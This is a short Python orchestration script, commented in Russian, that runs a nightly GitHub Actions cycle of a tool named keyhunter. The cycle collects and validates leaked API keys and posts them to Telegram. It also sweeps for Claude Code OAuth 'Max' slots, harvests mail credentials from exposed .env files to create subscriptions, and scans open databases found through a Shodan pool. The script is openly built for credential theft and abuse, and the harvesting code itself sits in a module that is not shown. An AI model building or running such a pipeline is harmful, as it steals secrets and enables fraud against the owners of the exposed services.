#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
night_run — ночной прогон ПОЛНОГО keyhunter для GitHub Actions.

Эквивалент одного цикла монитора:
  1. run_once(post=True)     — все источники + экстрактор + валидация + TG
  2. cc_proxy_sweep(cycle)   — автоохота на Max-слоты CC-OAuth (setup_token)
  3. env_smtp_sweep(cycle)   — открытые .env с почтовыми кредами -> подписки

cycle = время // 1800 (кратно cron */30) — растёт от запуска к запуску,
странично прошаривает shodan-пул свипов.
"""

import time

import keyhunter as kh

CYCLE = int(time.time() // 1800)

kh.log("=== night_run: цикл #%d (полный keyhunter) ===" % CYCLE)

try:
    kh.run_once(post=True)
except Exception as e:
    kh.log("run_once err: %s: %s" % (type(e).__name__, e))

try:
    fat = kh.cc_proxy_sweep(CYCLE)
    if fat:
        kh.log("  🔥 cc-sweep: %d Max-слотов!" % len(fat))
except Exception as e:
    kh.log("cc-sweep err: %s" % e)

try:
    env = kh.env_smtp_sweep(CYCLE)
    if env:
        kh.log("  📧 env-smtp sweep: %d находок" % len(env))
except Exception as e:
    kh.log("env-smtp err: %s" % e)

try:
    kh.self_keysmith(CYCLE)
except Exception as e:
    kh.log("keysmith err: %s" % e)

try:
    kh.opendb_sweep(CYCLE)
except Exception as e:
    kh.log("opendb err: %s" % e)

kh.log("=== night_run: цикл #%d завершён ===" % CYCLE)

# P0-ФИКС: некоторые треди keyhunter (висячие сокеты без таймаута) не дают
# процессу выйти -> джоб висит 20+ мин -> таймаут убивает ДО коммита стейта
# -> дедуп не сохраняется -> дубли в TG. Выходим жёстко, немедленно.
import os as _os

_os._exit(0)
